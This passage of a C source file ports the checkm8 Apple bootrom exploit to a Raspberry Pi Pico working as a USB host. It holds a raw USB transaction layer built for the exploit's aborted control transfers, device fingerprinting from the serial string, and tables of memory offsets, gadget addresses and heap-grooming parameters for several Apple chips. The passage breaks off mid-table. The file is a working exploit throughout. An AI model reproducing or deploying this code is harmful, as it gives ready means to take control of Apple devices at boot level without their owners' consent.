#include "checkm8.h"

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "app_log.h"
#include "pico/stdlib.h"
#include "hardware/structs/usb.h"
#include "hardware/structs/usb_dpram.h"
#include "hardware/irq.h"
#include "tusb.h"


#define APPLE_VID 0x05acu
#define DFU_MODE_PID 0x1227u
#define DFU_DNLOAD 1u
#define DFU_GET_STATUS 3u
#define DFU_CLR_STATUS 4u
#define DFU_STATUS_OK 0u
#define DFU_STATE_MANIFEST_SYNC 6u
#define DFU_STATE_MANIFEST 7u
#define DFU_STATE_MANIFEST_WAIT_RESET 8u
#define DFU_FILE_SUFFIX_LEN 16u
#define DFU_MAX_TRANSFER_SZ 0x800u
#define EP0_MAX_PACKET_SZ 0x40u
#define MAX_BLOCK_SZ 0x50u
#define USB_MAX_STRING_DESCRIPTOR_IDX 10u
#define CONTROL_TIMEOUT_MS 500u
#define USB_TIMEOUT_MS 5u
#define USB_ABORT_TIMEOUT_MIN_MS 0u
#define ABORT_TIMEOUT_SCALE_US 265u

#define DONE_MAGIC 0x646F6E65646F6E65ULL
#define EXEC_MAGIC 0x6578656365786563ULL
#define MEMC_MAGIC 0x6D656D636D656D63ULL
#define ARM_16K_TT_L2_SZ 0x2000000u

#ifndef MIN
#define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif

#define SIE_CTRL_BASE (USB_SIE_CTRL_SOF_EN_BITS | USB_SIE_CTRL_KEEP_ALIVE_EN_BITS | \
                       USB_SIE_CTRL_PULLDOWN_EN_BITS | USB_SIE_CTRL_EP0_INT_1BUF_BITS)

#define usb_hw_set   ((usb_hw_t *)hw_set_alias_untyped(usb_hw))
#define usb_hw_clear ((usb_hw_t *)hw_clear_alias_untyped(usb_hw))

typedef enum {
    USB_TRANSFER_OK,
    USB_TRANSFER_ERROR,
    USB_TRANSFER_STALL,
} usb_transfer_t;

typedef struct {
    usb_transfer_t ret;
    uint32_t sz;
} transfer_ret_t;

typedef struct {
    uint64_t func;
    uint64_t arg;
} callback_t;

typedef struct {
    uint32_t endpoint;
    uint32_t pad_0;
    uint64_t io_buffer;
    uint32_t status;
    uint32_t io_len;
    uint32_t ret_cnt;
    uint32_t pad_1;
    uint64_t callback;
    uint64_t next;
} dfu_callback_t;

typedef struct {
    uint32_t endpoint;
    uint32_t io_buffer;
    uint32_t status;
    uint32_t io_len;
    uint32_t ret_cnt;
    uint32_t callback;
    uint32_t next;
} dfu_callback_armv7_t;

typedef struct {
    dfu_callback_t callback;
} checkm8_overwrite_t;

typedef struct {
    dfu_callback_armv7_t callback;
} checkm8_overwrite_armv7_t;

typedef struct {
    volatile bool done;
    volatile xfer_result_t result;
    volatile uint32_t actual_len;
    uint16_t requested_len;
} control_wait_t;

typedef struct {
    checkm8_stage_t stage;
    uint16_t cpid;
    uint8_t serial_idx;
    size_t config_hole;
    size_t ttbr0_vrom_off;
    size_t ttbr0_sram_off;
    size_t config_large_leak;
    size_t config_overwrite_pad;
    uint64_t tlbi;
    uint64_t nop_gadget;
    uint64_t ret_gadget;
    uint64_t patch_addr;
    uint64_t ttbr0_addr;
    uint64_t func_gadget;
    uint64_t write_ttbr0;
    uint64_t memcpy_addr;
    uint64_t aes_crypto_cmd;
    uint64_t boot_tramp_end;
    uint64_t gUSBSerialNumber;
    uint64_t dfu_handle_request;
    uint64_t usb_core_do_transfer;
    uint64_t dfu_handle_bus_reset;
    uint64_t insecure_memory_base;
    uint64_t handle_interface_request;
    uint64_t usb_create_string_descriptor;
    uint64_t usb_serial_number_string_descriptor;
    uint32_t payload_dest_armv7;
} checkm8_context_t;

static uint8_t control_zero_buf[DFU_MAX_TRANSFER_SZ + 1];
static checkm8_context_t ctx;
static char const pwnd_str[] = " PWND:[checkm8]";

/* ------------------------------------------------------------------ */
/* Native USB SIE raw transaction layer                               */
/* ------------------------------------------------------------------ */

typedef enum {
    RAW_HW_OK,
    RAW_HW_STALL,
    RAW_HW_TIMEOUT,
    RAW_HW_ERROR,
} raw_hw_result_t;

static uint8_t raw_data_pid;

static void raw_hw_enter(void) {
    irq_set_enabled(USBCTRL_IRQ, false);
    usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS |
                               USB_SIE_STATUS_STALL_REC_BITS |
                               USB_SIE_STATUS_NAK_REC_BITS |
                               USB_SIE_STATUS_RX_TIMEOUT_BITS |
                               USB_SIE_STATUS_ACK_REC_BITS |
                               USB_SIE_STATUS_DATA_SEQ_ERROR_BITS;
    usb_hw_clear->buf_status = usb_hw->buf_status;
}

static void raw_hw_exit(void) {
    usb_hw->sie_ctrl = SIE_CTRL_BASE;
    usbh_dpram->epx_buf_ctrl = 0;
    busy_wait_at_least_cycles(12);
    usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS |
                               USB_SIE_STATUS_STALL_REC_BITS |
                               USB_SIE_STATUS_NAK_REC_BITS |
                               USB_SIE_STATUS_RX_TIMEOUT_BITS |
                               USB_SIE_STATUS_ACK_REC_BITS |
                               USB_SIE_STATUS_DATA_SEQ_ERROR_BITS;
    usb_hw_clear->buf_status = usb_hw->buf_status;
    irq_set_enabled(USBCTRL_IRQ, true);
}

static raw_hw_result_t raw_hw_poll_complete(uint32_t timeout_ms) {
    absolute_time_t deadline = make_timeout_time_ms(timeout_ms);

    while (!time_reached(deadline)) {
        uint32_t status = usb_hw->sie_status;

        if (status & USB_SIE_STATUS_STALL_REC_BITS) {
            usb_hw_clear->sie_status = USB_SIE_STATUS_STALL_REC_BITS;
            return RAW_HW_STALL;
        }
        if (status & USB_SIE_STATUS_TRANS_COMPLETE_BITS) {
            usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS;
            return RAW_HW_OK;
        }
        if (usb_hw->buf_status & 1u) {
            usb_hw_clear->buf_status = 1u;
            return RAW_HW_OK;
        }

        tight_loop_contents();
    }

    return RAW_HW_TIMEOUT;
}

static raw_hw_result_t raw_hw_send_setup(uint8_t dev_addr, uint8_t const setup[8], uint32_t timeout_ms) {
    memcpy((void *)usbh_dpram->setup_packet, setup, 8);
    usb_hw->dev_addr_ctrl = dev_addr;

    usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS |
                               USB_SIE_STATUS_STALL_REC_BITS;

    uint32_t flags = SIE_CTRL_BASE | USB_SIE_CTRL_SEND_SETUP_BITS | USB_SIE_CTRL_START_TRANS_BITS;
    usb_hw->sie_ctrl = flags & ~USB_SIE_CTRL_START_TRANS_BITS;
    busy_wait_at_least_cycles(12);
    usb_hw->sie_ctrl = flags;

    raw_data_pid = 1;
    return raw_hw_poll_complete(timeout_ms);
}

static raw_hw_result_t raw_hw_data_out(uint8_t dev_addr, void *data, uint16_t len, uint32_t timeout_ms,
                                       uint16_t *actual_len) {
    if (len > 0) {
        memcpy(usbh_dpram->epx_data, data, len);
    }

    usb_hw->dev_addr_ctrl = dev_addr;

    uint32_t buf_ctrl = USB_BUF_CTRL_FULL | USB_BUF_CTRL_LAST |
                        (raw_data_pid ? USB_BUF_CTRL_DATA1_PID : USB_BUF_CTRL_DATA0_PID) |
                        (len & USB_BUF_CTRL_LEN_MASK);

    usbh_dpram->epx_buf_ctrl = buf_ctrl;
    busy_wait_at_least_cycles(12);
    usbh_dpram->epx_buf_ctrl = buf_ctrl | USB_BUF_CTRL_AVAIL;

    usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS |
                               USB_SIE_STATUS_STALL_REC_BITS |
                               USB_SIE_STATUS_NAK_REC_BITS;
    usb_hw_clear->buf_status = 1u;

    uint32_t flags = SIE_CTRL_BASE | USB_SIE_CTRL_SEND_DATA_BITS | USB_SIE_CTRL_START_TRANS_BITS;
    usb_hw->sie_ctrl = flags & ~USB_SIE_CTRL_START_TRANS_BITS;
    busy_wait_at_least_cycles(12);
    usb_hw->sie_ctrl = flags;

    raw_hw_result_t result = raw_hw_poll_complete(timeout_ms);
    if (actual_len) {
        *actual_len = (result == RAW_HW_OK) ? len : 0;
    }
    if (result == RAW_HW_OK) {
        raw_data_pid ^= 1;
    }
    return result;
}

static raw_hw_result_t raw_hw_data_in(uint8_t dev_addr, void *data, uint16_t max_len, uint32_t timeout_ms,
                                      uint16_t *actual_len) {
    usb_hw->dev_addr_ctrl = dev_addr;

    uint32_t buf_ctrl = USB_BUF_CTRL_LAST |
                        (raw_data_pid ? USB_BUF_CTRL_DATA1_PID : USB_BUF_CTRL_DATA0_PID) |
                        (max_len & USB_BUF_CTRL_LEN_MASK);

    usbh_dpram->epx_buf_ctrl = buf_ctrl;
    busy_wait_at_least_cycles(12);
    usbh_dpram->epx_buf_ctrl = buf_ctrl | USB_BUF_CTRL_AVAIL;

    usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS |
                               USB_SIE_STATUS_STALL_REC_BITS;
    usb_hw_clear->buf_status = 1u;

    uint32_t flags = SIE_CTRL_BASE | USB_SIE_CTRL_RECEIVE_DATA_BITS | USB_SIE_CTRL_START_TRANS_BITS;
    usb_hw->sie_ctrl = flags & ~USB_SIE_CTRL_START_TRANS_BITS;
    busy_wait_at_least_cycles(12);
    usb_hw->sie_ctrl = flags;

    raw_hw_result_t result = raw_hw_poll_complete(timeout_ms);
    if (result == RAW_HW_OK) {
        uint16_t got = usbh_dpram->epx_buf_ctrl & USB_BUF_CTRL_LEN_MASK;
        if (got > max_len) got = max_len;
        if (data && got > 0) {
            memcpy(data, usbh_dpram->epx_data, got);
        }
        if (actual_len) *actual_len = got;
        raw_data_pid ^= 1;
    } else {
        if (actual_len) *actual_len = 0;
    }
    return result;
}

static void raw_hw_abort(void) {
    usb_hw_set->sie_ctrl = USB_SIE_CTRL_STOP_TRANS_BITS;
    busy_wait_us(10);
    usb_hw_clear->sie_status = USB_SIE_STATUS_TRANS_COMPLETE_BITS |
                               USB_SIE_STATUS_STALL_REC_BITS |
                               USB_SIE_STATUS_NAK_REC_BITS |
                               USB_SIE_STATUS_RX_TIMEOUT_BITS;
    usb_hw_clear->buf_status = usb_hw->buf_status;
}

/* ------------------------------------------------------------------ */
/* Raw control transfer wrappers                                      */
/* ------------------------------------------------------------------ */

static void setup_packet(uint8_t packet[8], uint8_t bm_request_type, uint8_t b_request,
                         uint16_t w_value, uint16_t w_index, uint16_t w_length) {
    packet[0] = bm_request_type;
    packet[1] = b_request;
    packet[2] = (uint8_t)(w_value & 0xffu);
    packet[3] = (uint8_t)(w_value >> 8);
    packet[4] = (uint8_t)(w_index & 0xffu);
    packet[5] = (uint8_t)(w_index >> 8);
    packet[6] = (uint8_t)(w_length & 0xffu);
    packet[7] = (uint8_t)(w_length >> 8);
}

static bool raw_control_out(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                            uint16_t w_value, uint16_t w_index, void *data, size_t len,
                            bool require_status) {
    uint8_t setup[8];
    bool ok = false;

    setup_packet(setup, bm_request_type, b_request, w_value, w_index, (uint16_t)len);
    raw_hw_enter();

    raw_hw_result_t r = raw_hw_send_setup(daddr, setup, CONTROL_TIMEOUT_MS);
    if (r != RAW_HW_OK) goto out;

    if (len != 0) {
        size_t off = 0;
        while (off < len) {
            uint16_t chunk = (uint16_t)MIN(len - off, EP0_MAX_PACKET_SZ);
            uint16_t actual = 0;
            r = raw_hw_data_out(daddr, (uint8_t *)data + off, chunk,
                                require_status ? CONTROL_TIMEOUT_MS : USB_TIMEOUT_MS, &actual);
            if (r != RAW_HW_OK) goto out;
            off += chunk;
        }
    }

    {
        uint16_t status_actual = 0;
        r = raw_hw_data_in(daddr, NULL, 0,
                           require_status ? CONTROL_TIMEOUT_MS : USB_TIMEOUT_MS, &status_actual);
        if (r != RAW_HW_OK && !require_status) {
            ok = true;
            goto out;
        }
        if (r != RAW_HW_OK) goto out;
    }

    ok = true;

out:
    if (!ok) {
        raw_hw_abort();
    }
    raw_hw_exit();
    return ok;
}

static bool raw_control_in(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                           uint16_t w_value, uint16_t w_index, void *data, size_t len,
                           bool require_status, transfer_ret_t *transfer_ret) {
    uint8_t setup[8];
    bool ok = false;
    uint32_t total_received = 0;

    setup_packet(setup, bm_request_type, b_request, w_value, w_index, (uint16_t)len);
    raw_hw_enter();

    raw_hw_result_t r = raw_hw_send_setup(daddr, setup, CONTROL_TIMEOUT_MS);
    if (r != RAW_HW_OK) goto out;

    if (len != 0) {
        size_t off = 0;
        while (off < len) {
            uint16_t chunk = (uint16_t)MIN(len - off, EP0_MAX_PACKET_SZ);
            uint16_t actual = 0;
            r = raw_hw_data_in(daddr, (uint8_t *)data + off, chunk,
                               require_status ? CONTROL_TIMEOUT_MS : USB_TIMEOUT_MS, &actual);
            if (r != RAW_HW_OK) {
                total_received = (uint32_t)off;
                goto out;
            }
            off += actual;
            if (actual < chunk) break;
        }
        total_received = (uint32_t)off;
    }

    {
        uint16_t status_actual = 0;
        raw_data_pid = 1;
        r = raw_hw_data_out(daddr, NULL, 0,
                            require_status ? CONTROL_TIMEOUT_MS : USB_TIMEOUT_MS, &status_actual);
        if (r != RAW_HW_OK && !require_status) {
            ok = true;
            goto out;
        }
        if (r != RAW_HW_OK) goto out;
    }

    ok = true;

out:
    if (!ok) {
        raw_hw_abort();
    }
    if (transfer_ret) {
        transfer_ret->sz = total_received;
        if (ok) {
            transfer_ret->ret = USB_TRANSFER_OK;
        } else if (r == RAW_HW_STALL) {
            transfer_ret->ret = USB_TRANSFER_STALL;
        } else {
            transfer_ret->ret = USB_TRANSFER_ERROR;
        }
    }
    raw_hw_exit();
    return ok;
}

static bool raw_control_out_abort(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                                  uint16_t w_value, uint16_t w_index, void *data, size_t len,
                                  uint32_t abort_timeout_ms, transfer_ret_t *transfer_ret) {
    uint8_t setup[8];
    bool ok = false;
    uint32_t total_sent = 0;
    bool aborted = false;

    setup_packet(setup, bm_request_type, b_request, w_value, w_index, (uint16_t)len);
    raw_hw_enter();

    raw_hw_result_t r = raw_hw_send_setup(daddr, setup, CONTROL_TIMEOUT_MS);
    if (r != RAW_HW_OK) goto out;

    if (len != 0) {
        uint32_t abort_us = abort_timeout_ms * ABORT_TIMEOUT_SCALE_US;
        absolute_time_t deadline = make_timeout_time_us(abort_us);
        size_t off = 0;
        while (off < len) {
            if (time_reached(deadline)) {
                raw_hw_abort();
                total_sent = (uint32_t)off;
                aborted = true;
                break;
            }
            uint16_t chunk = (uint16_t)MIN(len - off, EP0_MAX_PACKET_SZ);
            uint16_t actual = 0;
            r = raw_hw_data_out(daddr, (uint8_t *)data + off, chunk, CONTROL_TIMEOUT_MS, &actual);
            if (r == RAW_HW_TIMEOUT) {
                raw_hw_abort();
                total_sent = (uint32_t)off;
                aborted = true;
                break;
            }
            if (r != RAW_HW_OK) {
                total_sent = (uint32_t)off;
                goto out;
            }
            off += chunk;
            total_sent = (uint32_t)off;
        }
    }

    ok = true;

out:
    if (transfer_ret) {
        transfer_ret->sz = total_sent;
        if (aborted) {
            transfer_ret->ret = USB_TRANSFER_ERROR;
        } else if (r == RAW_HW_STALL) {
            transfer_ret->ret = USB_TRANSFER_STALL;
        } else if (ok) {
            transfer_ret->ret = USB_TRANSFER_OK;
        } else {
            transfer_ret->ret = USB_TRANSFER_ERROR;
        }
    }
    if (!ok && !aborted) raw_hw_abort();
    raw_hw_exit();
    return ok;
}

static bool raw_control_in_abort(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                                 uint16_t w_value, uint16_t w_index, void *data, size_t len,
                                 uint32_t abort_timeout_ms, transfer_ret_t *transfer_ret) {
    uint8_t setup[8];
    bool ok = false;
    uint32_t total_received = 0;
    bool aborted = false;

    setup_packet(setup, bm_request_type, b_request, w_value, w_index, (uint16_t)len);
    raw_hw_enter();

    raw_hw_result_t r = raw_hw_send_setup(daddr, setup, CONTROL_TIMEOUT_MS);
    if (r != RAW_HW_OK) goto out;

    if (len != 0) {
        uint32_t abort_us = abort_timeout_ms * ABORT_TIMEOUT_SCALE_US;
        absolute_time_t deadline = make_timeout_time_us(abort_us);
        size_t off = 0;
        while (off < len) {
            if (time_reached(deadline)) {
                raw_hw_abort();
                total_received = (uint32_t)off;
                aborted = true;
                break;
            }
            uint16_t chunk = (uint16_t)MIN(len - off, EP0_MAX_PACKET_SZ);
            uint16_t actual = 0;
            r = raw_hw_data_in(daddr, (uint8_t *)data + off, chunk, CONTROL_TIMEOUT_MS, &actual);
            if (r == RAW_HW_TIMEOUT) {
                raw_hw_abort();
                total_received = (uint32_t)off;
                aborted = true;
                break;
            }
            if (r != RAW_HW_OK) {
                total_received = (uint32_t)off;
                goto out;
            }
            off += actual;
            total_received = (uint32_t)off;
            if (actual < chunk) break;
        }
    }

    ok = true;

out:
    if (transfer_ret) {
        transfer_ret->sz = total_received;
        if (aborted) {
            transfer_ret->ret = USB_TRANSFER_ERROR;
        } else if (r == RAW_HW_STALL) {
            transfer_ret->ret = USB_TRANSFER_STALL;
        } else if (ok) {
            transfer_ret->ret = USB_TRANSFER_OK;
        } else {
            transfer_ret->ret = USB_TRANSFER_ERROR;
        }
    }
    if (!ok && !aborted) raw_hw_abort();
    raw_hw_exit();
    return ok;
}

/* ------------------------------------------------------------------ */
/* TinyUSB-based control transfer (for normal enumeration/probing)    */
/* ------------------------------------------------------------------ */

static void host_task_poll(void) {
    tuh_task_ext(0, false);
}

static void control_complete_cb(tuh_xfer_t *xfer) {
    control_wait_t *wait = (control_wait_t *)xfer->user_data;

    wait->actual_len = wait->requested_len == 0 ? 0 : xfer->actual_len;
    wait->result = xfer->result;
    wait->done = true;
}

static void map_transfer_ret(transfer_ret_t *transfer_ret, xfer_result_t result, uint32_t actual_len) {
    if (!transfer_ret) {
        return;
    }

    transfer_ret->sz = actual_len;
    if (result == XFER_RESULT_SUCCESS) {
        transfer_ret->ret = USB_TRANSFER_OK;
    } else if (result == XFER_RESULT_STALLED) {
        transfer_ret->ret = USB_TRANSFER_STALL;
    } else {
        transfer_ret->ret = USB_TRANSFER_ERROR;
    }
}

static char const *transfer_name(usb_transfer_t ret) {
    switch (ret) {
    case USB_TRANSFER_OK:
        return "ok";
    case USB_TRANSFER_STALL:
        return "stall";
    case USB_TRANSFER_ERROR:
        return "err";
    default:
        return "?";
    }
}

static void recover_ep0_after_expected_stall(uint8_t daddr) {
    tuh_edpt_abort_xfer(daddr, 0);
    host_task_poll();
}

static bool control_xfer(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                         uint16_t w_value, uint16_t w_index, void *data, size_t len,
                         uint32_t timeout_ms, transfer_ret_t *transfer_ret) {
    tusb_control_request_t request = {
        .bmRequestType = bm_request_type,
        .bRequest = b_request,
        .wValue = w_value,
        .wIndex = w_index,
        .wLength = (uint16_t)len,
    };
    control_wait_t wait = {
        .done = false,
        .result = XFER_RESULT_INVALID,
        .actual_len = 0,
        .requested_len = (uint16_t)len,
    };
    tuh_xfer_t xfer = {
        .daddr = daddr,
        .ep_addr = 0,
        .setup = &request,
        .buffer = data,
        .complete_cb = control_complete_cb,
        .user_data = (uintptr_t)&wait,
    };
    absolute_time_t deadline = make_timeout_time_ms(timeout_ms);

    if (!tuh_control_xfer(&xfer)) {
        map_transfer_ret(transfer_ret, XFER_RESULT_FAILED, 0);
        return false;
    }

    while (!wait.done) {
        host_task_poll();
        if (time_reached(deadline)) {
            tuh_edpt_abort_xfer(daddr, 0);
            map_transfer_ret(transfer_ret, XFER_RESULT_FAILED, 0);
            return false;
        }
    }

    map_transfer_ret(transfer_ret, wait.result, wait.actual_len);
    return true;
}

static bool control_xfer_abort(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                               uint16_t w_value, uint16_t w_index, void *data, size_t len,
                               uint32_t abort_timeout_ms, transfer_ret_t *transfer_ret) {
    if (bm_request_type & 0x80u) {
        return raw_control_in_abort(daddr, bm_request_type, b_request, w_value, w_index,
                                    data, len, abort_timeout_ms, transfer_ret);
    }

    return raw_control_out_abort(daddr, bm_request_type, b_request, w_value, w_index,
                                 data, len, abort_timeout_ms, transfer_ret);
}

static bool control_xfer_no_data_timeout(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                                         uint16_t w_value, uint16_t w_index, size_t len,
                                         uint32_t timeout_ms, transfer_ret_t *transfer_ret) {
    if (len > sizeof(control_zero_buf)) {
        return false;
    }

    memset(control_zero_buf, 0, len);
    return control_xfer(daddr, bm_request_type, b_request, w_value, w_index,
                        len ? control_zero_buf : NULL, len, timeout_ms, transfer_ret);
}

static bool control_xfer_abort_no_data(uint8_t daddr, uint8_t bm_request_type, uint8_t b_request,
                                       uint16_t w_value, uint16_t w_index, size_t len,
                                       uint32_t abort_timeout_ms, transfer_ret_t *transfer_ret) {
    if (len > sizeof(control_zero_buf)) {
        return false;
    }

    memset(control_zero_buf, 0, len);
    return control_xfer_abort(daddr, bm_request_type, b_request, w_value, w_index,
                              len ? control_zero_buf : NULL, len, abort_timeout_ms, transfer_ret);
}

static bool serial_contains(char const *serial, char const *needle) {
    return strstr(serial, needle) != NULL;
}

static bool read_string_descriptor_ascii(uint8_t daddr, uint8_t index, char *out, size_t out_len) {
    uint8_t string_desc[255];
    transfer_ret_t transfer_ret;
    uint8_t xfer_result;

    if (out_len != 0) {
        out[0] = 0;
    }

    memset(string_desc, 0, sizeof(string_desc));
    if (control_xfer(daddr, 0x80, 6, (3u << 8u) | index, 0x0409, string_desc,
                     2, CONTROL_TIMEOUT_MS, &transfer_ret)) {
        xfer_result = transfer_ret.ret == USB_TRANSFER_OK ? XFER_RESULT_SUCCESS : XFER_RESULT_FAILED;
    } else {
        xfer_result = XFER_RESULT_FAILED;
    }

    if (xfer_result != XFER_RESULT_SUCCESS ||
        transfer_ret.sz != 2 ||
        string_desc[0] < 2 ||
        string_desc[1] != TUSB_DESC_STRING) {
        return false;
    }

    uint8_t string_len = string_desc[0];
    memset(string_desc, 0, sizeof(string_desc));
    if (control_xfer(daddr, 0x80, 6, (3u << 8u) | index, 0x0409, string_desc,
                     string_len, CONTROL_TIMEOUT_MS, &transfer_ret)) {
        xfer_result = transfer_ret.ret == USB_TRANSFER_OK ? XFER_RESULT_SUCCESS : XFER_RESULT_FAILED;
    } else {
        xfer_result = XFER_RESULT_FAILED;
    }

    if (xfer_result != XFER_RESULT_SUCCESS ||
        transfer_ret.sz != string_len ||
        string_desc[0] != string_len ||
        string_desc[1] != TUSB_DESC_STRING) {
        return false;
    }

    size_t out_pos = 0;
    for (size_t i = 2; i + 1 < string_desc[0] && out_pos + 1 < out_len; i += 2) {
        out[out_pos++] = (char)string_desc[i];
    }
    if (out_len != 0) {
        out[out_pos] = 0;
    }

    return out_pos != 0;
}

static uint8_t log_device_descriptor(uint8_t daddr) {
    tusb_desc_device_t desc;
    transfer_ret_t transfer_ret;
    bool queued;

    memset(&desc, 0, sizeof(desc));
    queued = control_xfer(daddr, 0x80, 6, (1u << 8u), 0, &desc, sizeof(desc),
                          CONTROL_TIMEOUT_MS, &transfer_ret);
    if (!queued ||
        transfer_ret.ret != USB_TRANSFER_OK ||
        transfer_ret.sz < sizeof(desc) ||
        desc.bLength != sizeof(desc) ||
        desc.bDescriptorType != 1) {
        app_logf("checkm8: desc failed queued=%u ret=%s sz=%lu len=%u type=%u\r\n",
                 queued ? 1u : 0u,
                 transfer_name(transfer_ret.ret),
                 (unsigned long)transfer_ret.sz,
                 desc.bLength,
                 desc.bDescriptorType);
        return 0;
    }

    app_logf("checkm8: desc: usb=%04x class=%02x sub=%02x proto=%02x mps0=%u "
             "vid=%04x pid=%04x bcd=%04x iMfg=%u iProd=%u iSerial=%u nCfg=%u\r\n",
             desc.bcdUSB,
             desc.bDeviceClass,
             desc.bDeviceSubClass,
             desc.bDeviceProtocol,
             desc.bMaxPacketSize0,
             desc.idVendor,
             desc.idProduct,
             desc.bcdDevice,
             desc.iManufacturer,
             desc.iProduct,
             desc.iSerialNumber,
             desc.bNumConfigurations);
    return desc.iSerialNumber;
}

static void clear_target_config(void) {
    checkm8_stage_t stage = ctx.stage;
    uint8_t serial_idx = ctx.serial_idx;

    memset(&ctx, 0, sizeof(ctx));
    ctx.stage = stage;
    ctx.serial_idx = serial_idx;
}

static bool configure_target_from_serial(char const *serial) {
    clear_target_config();

    if (serial_contains(serial, " SRTG:[iBoot-1145.3]")) {
        ctx.cpid = 0x8950;
        ctx.config_large_leak = 659;
        ctx.config_overwrite_pad = 0x640;
        ctx.memcpy_addr = 0x9ACC;
        ctx.aes_crypto_cmd = 0x7301;
        ctx.gUSBSerialNumber = 0x10061F80;
        ctx.dfu_handle_request = 0x10061A24;
        ctx.payload_dest_armv7 = 0x10079800;
        ctx.usb_core_do_transfer = 0x7621;
        ctx.dfu_handle_bus_reset = 0x10061A3C;
        ctx.insecure_memory_base = 0x10000000;
        ctx.handle_interface_request = 0x8161;
        ctx.usb_create_string_descriptor = 0x7C55;
        ctx.usb_serial_number_string_descriptor = 0x100600D8;
    } else if (serial_contains(serial, " SRTG:[iBoot-1145.3.3]")) {
        ctx.cpid = 0x8955;
        ctx.config_large_leak = 659;
        ctx.config_overwrite_pad = 0x640;
        ctx.memcpy_addr = 0x9B0C;
        ctx.aes_crypto_cmd = 0x7341;
        ctx.gUSBSerialNumber = 0x10061F80;
        ctx.dfu_handle_request = 0x10061A24;
        ctx.payload_dest_armv7 = 0x10079800;
        ctx.usb_core_do_transfer = 0x7661;
        ctx.dfu_handle_bus_reset = 0x10061A3C;
        ctx.insecure_memory_base = 0x10000000;
        ctx.handle_interface_request = 0x81A1;
        ctx.usb_create_string_descriptor = 0x7C95;
        ctx.usb_serial_number_string_descriptor = 0x100600D8;
    } else if (serial_contains(serial, " SRTG:[iBoot-1458.2]")) {
        ctx.cpid = 0x8947;
        ctx.config_large_leak = 626;
        ctx.config_overwrite_pad = 0x660;
        ctx.memcpy_addr = 0x9A3C;
        ctx.aes_crypto_cmd = 0x7061;
        ctx.gUSBSerialNumber = 0x3402DDF8;
        ctx.dfu_handle_request = 0x3402D92C;
        ctx.payload_dest_armv7 = 0x34039800;
        ctx.usb_core_do_transfer = 0x79ED;
        ctx.dfu_handle_bus_reset = 0x3402D944;
        ctx.insecure_memory_base = 0x34000000;
        ctx.handle_interface_request = 0x7BC9;
        ctx.usb_create_string_descriptor = 0x72A9;
        ctx.usb_serial_number_string_descriptor = 0x3402C2DA;
    } else if (serial_contains(serial, " SRTG:[iBoot-1704.10]")) {
        ctx.cpid = 0x8960;
        ctx.config_large_leak = 7936;
        ctx.config_overwrite_pad = 0x5C0;
        ctx.patch_addr = 0x100005CE0;
        ctx.memcpy_addr = 0x10000ED50;
        ctx.aes_crypto_cmd = 0x10000B9A8;
        ctx.boot_tramp_end = 0x1800E1000;
        ctx.gUSBSerialNumber = 0x180086CDC;
        ctx.dfu_handle_request = 0x180086C70;
        ctx.usb_core_do_transfer = 0x10000CC78;
        ctx.dfu_handle_bus_reset = 0x180086CA0;
        ctx.insecure_memory_base = 0x180380000;
        ctx.handle_interface_request = 0x10000CFB4;
        ctx.usb_create_string_descriptor = 0x10000BFEC;
        ctx.usb_serial_number_string_descriptor = 0x180080562;
    } else if (serial_contains(serial, " SRTG:[iBoot-1991.0.0.2.16]")) {
        ctx.cpid = 0x7001;
        ctx.config_overwrite_pad = 0x500;
        ctx.patch_addr = 0x10000AD04;
        ctx.memcpy_addr = 0x100013F10;
        ctx.aes_crypto_cmd = 0x100010A90;
        ctx.boot_tramp_end = 0x1800E1000;
        ctx.gUSBSerialNumber = 0x180088E48;
        ctx.dfu_handle_request = 0x180088DF8;
        ctx.usb_core_do_transfer = 0x100011BB4;
        ctx.dfu_handle_bus_reset = 0x180088E18;
        ctx.insecure_memory_base = 0x180380000;
        ctx.handle_interface_request = 0x100011EE4;
        ctx.usb_create_string_descriptor = 0x100011074;
        ctx.usb_serial_number_string_descriptor = 0x180080C2A;
    } else if (serial_contains(serial, " SRTG:[iBoot-1992.0.0.1.19]")) {
        ctx.cpid = 0x7000;
        ctx.config_overwrite_pad = 0x500;
        ctx.patch_addr = 0x100007E98;
        ctx.memcpy_addr = 0x100010E70;
        ctx.aes_crypto_cmd = 0x10000DA90;
        ctx.boot_tramp_end = 0x1800E1000;
        ctx.gUSBSerialNumber = 0x1800888C8;
        ctx.dfu_handle_request = 0x180088878;
        ctx.usb_core_do_transfer = 0x10000EBB4;
        ctx.dfu_handle_bus_reset = 0x180088898;
        ctx.insecure_memory_base = 0x180380000;
        ctx.handle_interface_request = 0x10000EEE4;
        ctx.usb_create_string_descriptor = 0x10000E074;
        ctx.usb_serial_number_string_descriptor = 0x18008062A;
    } else if (serial_contains(serial, " SRTG:[iBoot-2098.0.0.2.4]")) {
        ctx.cpid = 0x7002;
        ctx.config_overwrite_pad = 0x500;
        ctx.memcpy_addr = 0x89F4;
        ctx.aes_crypto_cmd = 0x6341;
        ctx.gUSBSerialNumber = 0x46005958;
        ctx.dfu_handle_request = 0x46005898;
        ctx.payload_dest_armv7 = 0x46007800;
        ctx.usb_core_do_transfer = 0x6E59;
        ctx.dfu_handle_bus_reset = 0x460058B0;
        ctx.insecure_memory_base = 0x46018000;
        ctx.handle_interface_request = 0x7081;
        ctx.usb_create_string_descriptor = 0x6745;
        ctx.usb_serial_number_string_descriptor = 0x4600034A;
    } else if (serial_contains(serial, " SRTG:[iBoot-2234.0.0.2.22]")) {
        ctx.cpid = 0x8003;
        ctx.config_overwrite_pad = 0x500;
        ctx.patch_addr = 0x10000812C;
        ctx.ttbr0_addr = 0x1800C8000;
        ctx.memcpy_addr = 0x100011030;
        ctx.aes_crypto_cmd = 0x10000DAA0;
        ctx.ttbr0_vrom_off = 0x400;
